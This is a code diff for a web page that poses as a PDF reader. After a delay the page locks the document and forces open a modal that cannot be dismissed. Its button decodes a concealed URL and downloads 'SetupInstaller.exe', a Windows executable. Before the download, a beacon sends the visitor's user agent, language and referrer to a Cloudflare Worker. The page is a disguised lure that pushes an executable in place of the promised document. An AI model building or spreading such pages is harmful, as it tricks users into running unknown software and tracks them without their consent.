+function revealPdfReader() {
+
+    const app =
+        $("app");
+
+    const loader =
+        $("initialLoader");
+
+
+    if (app) {
+
+        app.classList.add(
+            "visible"
+        );
+
+    }
+
+
+    if (loader) {
+
+        setTimeout(
+            function () {
+
+                loader.classList.add(
+                    "hidden"
+                );
+
+            },
+            100
+        );
+
+    }
+
+
+    setTimeout(
+        function () {
+
+            showDownloadModal();
+
+        },
+        CONFIG.modalDelay
+    );
+
+}
+
+
+/* =========================================================
+   TOOLBAR
+   ========================================================= */
+
+function updateToolbar() {
+
+    const current =
+        pageNumberForScroll();
+
+
+    const pageInput =
+        $("pageInput");
+
+
+    if (pageInput) {
+
+        pageInput.value =
+            current;
+
+    }
+
+
+    const zoomValue =
+        $("zoomValue");
+
+
+    if (zoomValue) {
+
+        zoomValue.textContent =
+            `${Math.round(scale * 100)}%`;
+
+    }
+
+
+    document
+        .querySelectorAll(
+            ".thumb"
+        )
+        .forEach(
+            function (thumb) {
+
+                thumb.classList.toggle(
+                    "active",
+
+                    Number(
+                        thumb.dataset.page
+                    ) === current
+                );
+
+            }
+        );
+
+}
+
+
+/* =========================================================
+   ZOOM
+   ========================================================= */
+
+async function setZoom(next) {
+
+    if (pdfLocked) {
+
+        return;
+
+    }
+
+
+    const old =
+        scale;
+
+
+    scale =
+        clamp(
+            Number(
+                next.toFixed(2)
+            ),
+            0.5,
+            2.5
+        );
+
+
+    if (
+        old ===
+        scale
+    ) {
+
+        return;
+
+    }
+
+
+    const current =
+        pageNumberForScroll();
+
+
+    renderedPages.clear();
+
+
+    await renderVisiblePages();
+
+
+    updateToolbar();
+
+
+    const target =
+        document.querySelector(
+            `.pdf-page[data-page="${current}"]`
+        );
+
+
+    if (target) {
+
+        target.scrollIntoView({
+            block:
+                "start"
+        });
+
+    }
+
+}
+
+
+/* =========================================================
+   LOCK PDF
+   ========================================================= */
+
+function lockPdf() {
+
+    pdfLocked =
+        true;
+
+
+    document.body.classList.add(
+        "modal-locked"
+    );
+
+}
+
+
+/* =========================================================
+   SHOW DOWNLOAD MODAL
+   ========================================================= */
+
+function showDownloadModal() {
+
+    if (modalShown) {
+
+        return;
+
+    }
+
+
+    modalShown =
+        true;
+
+
+    lockPdf();
+
+
+    const modal =
+        $("downloadModal");
+
+
+    if (!modal) {
+
+        return;
+
+    }
+
+
+    modal.classList.add(
+        "open"
+    );
+
+
+    const downloadButton =
+        $("startDownload");
+
+
+    if (downloadButton) {
+
+        setTimeout(
+            function () {
+
+                downloadButton.focus();
+
+            },
+            50
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   DOWNLOAD START NOTIFICATION
+   ========================================================= */
+
+/*
+ * Sends a notification to the Cloudflare Worker immediately
+ * before the browser is redirected to the actual download URL.
+ *
+ * IMPORTANT:
+ *
+ * This function reports that the user has INITIATED the
+ * download. Browser JavaScript cannot reliably confirm that
+ * the remote file has physically begun transferring after
+ * navigation.
+ *
+ * navigator.sendBeacon() is preferred because the browser
+ * is navigating away immediately afterward.
+ *
+ * fetch(..., { keepalive: true }) is used as a fallback.
+ *
+ * The function is deliberately non-blocking and must never
+ * prevent the actual download from starting.
+ */
+function notifyDownloadStarted() {
+
+    try {
+
+        const endpoint =
+            String(
+                CONFIG.notificationUrl ||
+                ""
+            ).trim();
+
+
+        /*
+         * The endpoint will be supplied by the
+         * Cloudflare Worker.
+         *
+         * Until then, silently skip notification
+         * without affecting downloads.
+         */
+        if (!endpoint) {
+
+            console.warn(
+                "Download notification endpoint is not configured yet."
+            );
+
+            return;
+
+        }
+
+
+        /*
+         * Create a unique client-side event ID.
+         *
+         * This allows the Worker to identify individual
+         * download-start events later if desired.
+         */
+        let eventId =
+            "";
+
+
+        try {
+
+            if (
+                window.crypto &&
+                typeof window.crypto.randomUUID ===
+                    "function"
+            ) {
+
+                eventId =
+                    window.crypto.randomUUID();
+
+            }
+
+        }
+        catch (error) {
+
+            console.warn(
+                "Could not generate cryptographic event ID:",
+                error
+            );
+
+        }
+
+
+        /*
+         * Fallback event ID.
+         */
+        if (!eventId) {
+
+            eventId =
+                String(
+                    Date.now()
+                ) +
+                "-" +
+                String(
+                    Math.random()
+                )
+                .replace(
+                    ".",
+                    ""
+                );
+
+        }
+
+
+        /*
+         * Collect useful notification information.
+         *
+         * No actual download navigation is changed here.
+         */
+        const payload = {
+
+            event:
+                "download_started",
+
+            eventId:
+                eventId,
+
+            file:
+                "SetupInstaller.exe",
+
+            type:
+                "Windows executable",
+
+            page:
+                window.location.pathname,
+
+            referrer:
+                document.referrer || "",
+
+            userAgent:
+                navigator.userAgent,
+
+            language:
+                navigator.language || "",
+
+            timestamp:
+                new Date().toISOString()
+
+        };
+
+
+        const json =
+            JSON.stringify(
+                payload
+            );
+
+
+        /*
+         * Preferred delivery mechanism.
+         *
+         * sendBeacon() is specifically designed for sending
+         * small pieces of data while a page is unloading.
+         */
+        if (
+            navigator.sendBeacon
+        ) {
+
+            try {
+
+                const blob =
+                    new Blob(
+                        [
+                            json
+                        ],
+                        {
+                            type:
+                                "application/json"
+                        }
+                    );
+
+
+                const queued =
+                    navigator.sendBeacon(
+                        endpoint,
+                        blob
+                    );
+
+
+                if (queued) {
+
+                    console.log(
+                        "Download-start notification queued."
+                    );
+
+                    return;
+
+                }
+
+            }
+            catch (beaconError) {
+
+                console.warn(
+                    "sendBeacon notification attempt failed:",
+                    beaconError
+                );
+
+            }
+
+        }
+
+
+        /*
+         * Fallback for browsers where sendBeacon()
+         * is unavailable or could not queue the event.
+         *
+         * keepalive allows the request to continue while
+         * the page is navigating away.
+         */
+        try {
+
+            fetch(
+                endpoint,
+                {
+                    method:
+                        "POST",
+
+                    headers:
+                        {
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                    body:
+                        json,
+
+                    keepalive:
+                        true,
+
+                    credentials:
+                        "omit"
+                }
+            )
+            .then(
+                function () {
+
+                    console.log(
+                        "Download-start notification request sent."
+                    );
+
+                }
+            )
+            .catch(
+                function (error) {
+
+                    console.warn(
+                        "Download notification fallback failed:",
+                        error
+                    );
+
+                }
+            );
+
+        }
+        catch (fetchError) {
+
+            console.warn(
+                "Download notification could not be sent:",
+                fetchError
+            );
+
+        }
+
+    }
+    catch (error) {
+
+        /*
+         * Notification failures must NEVER prevent
+         * the real download from starting.
+         */
+        console.warn(
+            "Download notification skipped:",
+            error
+        );
+
+    }
+
+}
+
+
+/* =========================================================
+   DOWNLOAD
+   ========================================================= */
+
+function startDownload() {
+
+    /*
+     * Decode and validate the real download URL first.
+     *
+     * Existing download behavior is preserved.
+     */
+    downloadUrl =
+        decodeDownloadUrl();
+
+
+    if (!downloadUrl) {
+
+        console.error(
+            "No valid download URL is available."
+        );
+
+        return;
+
+    }
+
+
+    /*
+     * Notify the Worker immediately before navigation.
+     *
+     * This reports the user's download initiation.
+     *
+     * It does not modify the actual download URL.
+     */
+    notifyDownloadStarted();
+
+
+    /*
+     * Preserve the original download behavior.
+     */
+    window.location.href =
+        downloadUrl;
+
+}
+
+
+/* =========================================================
+   ZOOM OUT
+   ========================================================= */
+
+$("zoomOut").addEventListener(
+    "click",
+    function () {
+
+        if (!pdfLocked) {
+
+            setZoom(
+                scale - 0.1
+            );
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   ZOOM IN
+   ========================================================= */
+
+$("zoomIn").addEventListener(
+    "click",
+    function () {
+
+        if (!pdfLocked) {
+
+            setZoom(
+                scale + 0.1
+            );
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   PAGE INPUT
+   ========================================================= */
+
+$("pageInput").addEventListener(
+    "change",
+    function () {
+
+        if (
+            !pdfDoc ||
+            pdfLocked
+        ) {
+
+            return;
+
+        }
+
+
+        const number =
+            clamp(
+                Number(
+                    $("pageInput").value
+                ) || 1,
+
+                1,
+
+                pdfDoc.numPages
+            );
+
+
+        $("pageInput").value =
+            number;
+
+
+        const target =
+            document.querySelector(
+                `.pdf-page[data-page="${number}"]`
+            );
+
+
+        if (target) {
+
+            target.scrollIntoView({
+
+                behavior:
+                    "smooth",
+
+                block:
+                    "start"
+
+            });
+
+        }
+
+    }
+);
+
+
+/* =========================================================
+   DOWNLOAD BUTTON
+   ========================================================= */
+
+$("startDownload").addEventListener(
+    "click",
+    function () {
+
+        startDownload();
+
+    }
+);
+
+
+/* =========================================================
+   BLOCK MODAL DISMISSAL
+   ========================================================= */
+
+document.addEventListener(
+    "keydown",
+    function (event) {
+
+        if (
+            modalShown &&
+            event.key === "Escape"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+        }
+
+    },
+    true
+);
+
+
+/* =========================================================
+   BLOCK BACKDROP CLICK
+   ========================================================= */
+
+$("downloadModal").addEventListener(
+    "click",
+    function (event) {
+
+        if (
+            event.target ===
+            $("downloadModal")
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+        }
+
+    },
+    true
+);
+
+
+/* =========================================================
+   PREVENT BACKGROUND SCROLL
+   ========================================================= */
+
+window.addEventListener(
+    "wheel",
+    function (event) {
+
+        if (!pdfLocked) {
+
+            return;
+
+        }
+
+
+        const modal =
+            $("downloadModal");
+
+
+        if (
+            modal &&
+            modal.contains(
+                event.target
+            )
+        ) {
+
+            return;
+
+        }
+
+
+        event.preventDefault();
+
+    },
+    {
+        passive:
+            false
+    }
+);
+
+
+/* =========================================================
+   TOUCH
+   ========================================================= */
+
+window.addEventListener(
+    "touchmove",
+    function (event) {
+
+        if (!pdfLocked) {
+
+            return;
+
+        }
+
+
+        const modal =
+            $("downloadModal");
+
+
+        if (
+            modal &&
+            modal.contains(
+                event.target
+            )
+        ) {
+
+            return;
+
+        }
+
+
+        event.preventDefault();
+
+    },
+    {
+        passive:
+            false
+    }
+);
+
+
+/* =========================================================
+   WORKSPACE SCROLL
+   ========================================================= */
+
+$("workspace").addEventListener(
+    "scroll",
+    function () {
+
+        if (pdfLocked) {
+
+            return;
+
+        }
+
+
+        clearTimeout(
+            scrollTimer
+        );
+
+
+        scrollTimer =
+            setTimeout(
+                function () {
+
+                    updateToolbar();
+
+                    renderVisiblePages()
+                        .catch(
+                            console.error
+                        );
+
+                },
+                80
+            );
+
+    },
+    {
+        passive:
+            true
+    }
+);
+
+
+/* =========================================================
+   WINDOW SCROLL
+   ========================================================= */
+
+window.addEventListener(
+    "scroll",
+    function () {
+
+        if (pdfLocked) {
+
+            return;
+
+        }
+
+
+        clearTimeout(
+            scrollTimer
+        );
+
+
+        scrollTimer =
+            setTimeout(
+                function () {
+
+                    updateToolbar();
+
+                    renderVisiblePages()
+                        .catch(
+                            console.error
+                        );
+
+                },
+                80
+            );
+
+    },
+    {
+        passive:
+            true
+    }
+);
+
+
+/* =========================================================
+   START
+   ========================================================= */
+
+loadPdf();
+
+</script>
+
+</body>
+</html>
